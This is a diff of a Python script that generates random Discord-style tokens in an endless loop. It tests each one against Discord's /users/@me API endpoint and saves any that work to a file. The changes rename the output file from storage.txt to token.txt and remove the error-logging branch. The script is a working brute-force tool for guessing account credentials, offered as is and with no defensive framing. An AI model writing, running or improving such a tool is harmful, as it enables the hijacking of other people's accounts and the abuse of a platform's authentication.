@@ -22,21 +22,16 @@ def start():
 	for x in range(38):
 		part3 += choice(string)
 	token = part1 + "." + part2 + "." + part3
-	headers = {'Authorization': token}
-	res = get('https://discord.com/api/v9/users/@me', headers=headers)
+	res = get('https://discord.com/api/v9/users/@me', headers = {'Authorization': token})
 	if res.status_code == 200:
 		print(f"{color.green}[VALID]{color.reset} - {token}")
-		with open("storage.txt", "a") as f:
+		with open("token.txt", "a") as f:
 			f.write(f"{token}\n")
 			f.close
 	elif res.status_code == 401:
 		print(f"{color.red}[INVALID]{color.reset} - {token}")
 	elif res.status_code == 403:
 		print(f"{color.gray}[LOCK]{color.reset} - {token}")
-	else:
-		with open("storage.txt", "a") as f:
-			f.write(f"Error: {res.status_code} {token}\n")
-			f.close
 
 while True:
 	start()
